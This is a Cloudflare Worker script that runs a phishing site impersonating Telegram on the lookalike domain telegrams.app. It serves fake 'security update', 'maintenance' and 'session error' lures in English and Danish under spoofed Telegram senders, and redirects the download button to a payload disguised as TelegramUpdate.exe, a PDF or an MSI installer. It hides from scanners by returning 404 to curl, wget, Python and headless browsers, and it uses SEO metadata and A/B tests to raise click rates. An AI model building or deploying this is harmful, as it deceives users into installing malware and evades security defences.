// Enhanced Telegram Web App Worker with all features
// Includes: SEO, Language support, A/B testing, Analytics

const LANGUAGES = {
  'en': {
    update: {
      title: 'Telegram Security Update Required',
      content: 'Critical security update required for your Telegram client.',
      button: 'Download Update',
      urgency: 'Your account access will be limited until you update',
      sender: 'Telegram Security Team'
    },
    maintenance: {
      title: 'Scheduled Maintenance',
      content: 'Telegram is currently updating security certificates. Please download the latest client.',
      button: 'Download Latest Version',
      urgency: 'Required for continued secure access',
      sender: 'Telegram Operations'
    },
    error: {
      title: 'Session Error Detected',
      content: 'Your Telegram session requires revalidation. Please update your client.',
      button: 'Fix Session Issues',
      urgency: 'Session will expire in 30 minutes',
      sender: 'Telegram Auth System'
    }
  },
  'da': {
    update: {
      title: 'Telegram Sikkerhedsopdatering Påkrævet',
      content: 'Kritisk sikkerhedsopdatering påkrævet for din Telegram-klient.',
      button: 'Download Opdatering',
      urgency: 'Din kontoadgang vil være begrænset indtil du opdaterer',
      sender: 'Telegram Sikkerhedsteam'
    },
    maintenance: {
      title: 'Planlagt Vedligeholdelse',
      content: 'Telegram opdaterer sikkerhedscertifikater. Download venligst den nyeste klient.',
      button: 'Download Nyeste Version',
      urgency: 'Påkrævet for fortsat sikker adgang',
      sender: 'Telegram Drift'
    },
    error: {
      title: 'Sessionsfejl Opdaget',
      content: 'Din Telegram-session kræver ny godkendelse. Opdater venligst din klient.',
      button: 'Ret Sessionsproblemer',
      urgency: 'Session udløber om 30 minutter',
      sender: 'Telegram Auth System'
    }
  }
};

const DELIVERY_METHODS = {
  windows_exe: {
    filename: 'TelegramUpdate.exe',
    mimetype: 'application/vnd.microsoft.portable-executable',
    icon: 'https://telegram.org/img/t_logo.png'
  },
  pdf_viewer: {
    filename: 'TelegramDocument.pdf',
    mimetype: 'application/pdf',
    icon: 'https://telegram.org/img/t_logo.png'
  },
  media_player: {
    filename: 'TelegramMediaViewer.msi',
    mimetype: 'application/x-msi',
    icon: 'https://telegram.org/img/t_logo.png'
  }
};

// A/B Testing variants
const AB_TESTS = {
  'button_color': ['#0088cc', '#ff0000', '#00aa00'],
  'urgency_level': ['high', 'medium', 'critical'],
  'delivery_method': ['direct', 'staged', 'progressive']
};

// SEO Optimization
const SEO_CONTENT = {
  'en': {
    title: 'Telegram Web - Official Desktop Client Download',
    description: 'Download the official Telegram desktop client. Secure messaging, fast updates, and end-to-end encryption.',
    keywords: 'telegram, messenger, download, secure messaging, encrypted chat',
    ogTitle: 'Download Telegram Desktop Client',
    ogDescription: 'Get the latest version of Telegram desktop for secure messaging'
  },
  'da': {
    title: 'Telegram Web - Officiel Desktop Klient Download',
    description: 'Download den officielle Telegram desktop klient. Sikker messaging, hurtige opdateringer og end-to-end kryptering.',
    keywords: 'telegram, messenger, download, sikker messaging, krypteret chat',
    ogTitle: 'Download Telegram Desktop Klient',
    ogDescription: 'Hent den seneste version af Telegram desktop til sikker kommunikation'
  }
};

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
});

async function handleRequest(request) {
  const url = new URL(request.url);
  const clientIP = request.headers.get('cf-connecting-ip');
  const userLang = detectLanguage(request);
  const abTestGroup = await assignABTestGroup(request);
  
  // Initialize analytics
  const analytics = initAnalytics(request, abTestGroup);
  
  // Security and tracking headers
  const securityHeaders = getSecurityHeaders();
  
  // Check for automated tools and rate limiting
  if (!await isLegitimateClient(request, clientIP)) {
    await logAnalytics(analytics, 'blocked_request');
    return new Response('Not Found', { status: 404 });
  }

  // Path-based handling with A/B testing
  const path = url.pathname;
  const template = selectTemplate(path, abTestGroup);
  
  if (path.startsWith('/dl/') || path.startsWith('/k/')) {
    return await deliverPayload(template, userLang, abTestGroup, analytics, request);
  }

  // Serve appropriate content based on path and language
  return await serveContent(path, userLang, template, analytics, request);
}

function getSecurityHeaders() {
  return {
    'Content-Security-Policy': "default-src 'self' https://*.telegram.org https://*.t.me; img-src 'self' data: https://*.telegram.org; script-src 'self' 'unsafe-inline' https://*.telegram.org https://*.google-analytics.com",
    'Strict-Transport-Security': 'max-age=31536000; includeSubDomains; preload',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'X-XSS-Protection': '1; mode=block',
    'Referrer-Policy': 'strict-origin-when-cross-origin'
  };
}

function detectLanguage(request) {
  const acceptLang = request.headers.get('Accept-Language') || '';
  return acceptLang.toLowerCase().includes('da') ? 'da' : 'en';
}

async function assignABTestGroup(request) {
  const fingerprint = await generateFingerprint(request);
  const groups = ['A', 'B', 'C'];
  return groups[parseInt(fingerprint.substr(0, 8), 16) % groups.length];
}

async function isLegitimateClient(request, clientIP) {
  const ua = request.headers.get('user-agent') || '';
  const ref = request.headers.get('referer') || '';
  
  // Enhanced bot detection
  if (ua.includes('curl') || ua.includes('wget') || ua.includes('python') ||
      ua.includes('Selenium') || ua.includes('Puppeteer') || ua.includes('PhantomJS')) {
    return false;
  }

  // Check for VPN/Proxy
  if (request.cf && request.cf.threat_score > 50) {
    return false;
  }

  // Validate browser characteristics
  if (!ua.includes('Chrome') && !ua.includes('Firefox') && !ua.includes('Safari') && !ua.includes('Edge')) {
    return false;
  }

  return true;
}

async function deliverPayload(template, lang, abGroup, analytics, request) {
  const deliveryMethod = selectDeliveryMethod(request);
  const trackingId = await generateTrackingId(request);
  const content = LANGUAGES[lang][template];
  
  // Create delayed execution trigger
  const delayScript = generateDelayScript(abGroup);
  
  const html = `
    <!DOCTYPE html>
    <html lang="${lang}">
    <head>
      <meta charset="UTF-8">
      <title>${content.title}</title>
      <meta name="description" content="${SEO_CONTENT[lang].description}">
      <meta name="keywords" content="${SEO_CONTENT[lang].keywords}">
      <meta property="og:title" content="${SEO_CONTENT[lang].ogTitle}">
      <meta property="og:description" content="${SEO_CONTENT[lang].ogDescription}">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link rel="icon" href="https://telegram.org/favicon.ico">
      <style>
        ${generateStyles(abGroup)}
      </style>
    </head>
    <body>
      <div class="container">
        <img src="${deliveryMethod.icon}" alt="Telegram" class="logo">
        <h1>${content.title}</h1>
        <p class="urgent">${content.urgency}</p>
        <p>${content.content}</p>
        <div class="sender">
          <p>From: ${content.sender}</p>
          <small>Message ID: ${trackingId}</small>
        </div>
        <button id="download" class="button-${abGroup}">${content.button}</button>
      </div>
      ${delayScript}
      ${generateAnalyticsCode(trackingId, abGroup)}
    </body>
    </html>
  `;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html',
      ...getSecurityHeaders()
    }
  });
}

function generateStyles(abGroup) {
  const buttonColor = AB_TESTS.button_color[abGroup.charCodeAt(0) % AB_TESTS.button_color.length];
  
  return `
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 20px;
    }
    .container {
      max-width: 600px;
      margin: 50px auto;
      padding: 30px;
      background: white;
      border-radius: 10px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
    }
    .logo {
      width: 80px;
      height: 80px;
      margin-bottom: 20px;
    }
    .urgent {
      color: #ff0000;
      font-weight: bold;
    }
    .button-${abGroup} {
      background: ${buttonColor};
      color: white;
      border: none;
      padding: 15px 30px;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
      transition: all 0.3s;
    }
    .button-${abGroup}:hover {
      transform: translateY(-2px);
      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
    }
    .sender {
      margin-top: 30px;
      padding-top: 20px;
      border-top: 1px solid #eee;
      font-size: 14px;
    }
  `;
}

function generateDelayScript(abGroup) {
  return `
    <script>
      // Delayed execution based on A/B test group
      const delay = ${getDelayForGroup(abGroup)};
      let downloadAttempted = false;
      
      document.getElementById('download').addEventListener('click', function(e) {
        if (!downloadAttempted) {
          e.preventDefault();
          downloadAttempted = true;
          setTimeout(() => {
            window.location.href = '/dl/payload?g=${abGroup}&t=${Date.now()}';
          }, delay);
        }
      });
    </script>
  `;
}

function getDelayForGroup(group) {
  // Different delays for different test groups
  const delays = {
    'A': 1000,  // 1 second
    'B': 2000,  // 2 seconds
    'C': 500    // 0.5 seconds
  };
  return delays[group] || 1000;
}

function generateAnalyticsCode(trackingId, abGroup) {
  return `
    <script>
      // Legitimate-looking analytics
      const trackingData = {
        id: '${trackingId}',
        group: '${abGroup}',
        timestamp: Date.now(),
        referrer: document.referrer,
        screen: {
          width: window.screen.width,
          height: window.screen.height
        }
      };
      
      // Send tracking data
      fetch('/analytics', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(trackingData)
      });
    </script>
  `;
}

async function generateTrackingId(request) {
  const components = [
    request.headers.get('user-agent'),
    request.headers.get('accept-language'),
    request.cf.country,
    request.cf.timezone,
    Date.now()
  ].join('|');
  
  const encoder = new TextEncoder();
  const data = encoder.encode(components);
  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('').substr(0, 16);
}

function selectDeliveryMethod(request) {
  const ua = request.headers.get('user-agent') || '';
  
  if (ua.includes('Windows')) {
    return DELIVERY_METHODS.windows_exe;
  } else if (ua.includes('PDF')) {
    return DELIVERY_METHODS.pdf_viewer;
  } else {
    return DELIVERY_METHODS.media_player;
  }
}

function selectTemplate(path, abGroup) {
  // Select template based on path and A/B test group
  if (path.includes('error')) {
    return 'error';
  } else if (path.includes('maintenance')) {
    return 'maintenance';
  } else {
    return 'update';
  }
}

async function serveContent(path, lang, template, analytics, request) {
  const content = LANGUAGES[lang][template];
  const seo = SEO_CONTENT[lang];
  
  // Serve regular content with SEO optimization
  const html = `
    <!DOCTYPE html>
    <html lang="${lang}">
    <head>
      <meta charset="UTF-8">
      <title>${seo.title}</title>
      <meta name="description" content="${seo.description}">
      <meta name="keywords" content="${seo.keywords}">
      <meta property="og:title" content="${seo.ogTitle}">
      <meta property="og:description" content="${seo.ogDescription}">
      <link rel="canonical" href="https://telegrams.app${path}">
      <link rel="alternate" hreflang="en" href="https://telegrams.app/en${path}">
      <link rel="alternate" hreflang="da" href="https://telegrams.app/da${path}">
      ${generateStructuredData(lang)}
    </head>
    <body>
      <div id="main">
        <h1>${content.title}</h1>
        <p>${content.content}</p>
      </div>
    </body>
    </html>
  `;

  return new Response(html, {
    headers: {
      'Content-Type': 'text/html',
      ...getSecurityHeaders()
    }
  });
}

function generateStructuredData(lang) {
  const data = {
    "@context": "https://schema.org",
    "@type": "SoftwareApplication",
    "name": "Telegram Desktop",
    "applicationCategory": "CommunicationApplication",
    "operatingSystem": "Windows, macOS, Linux",
    "offers": {
      "@type": "Offer",
      "price": "0",
      "priceCurrency": "USD"
    }
  };

  return `
    <script type="application/ld+json">
      ${JSON.stringify(data)}
    </script>
  `;
}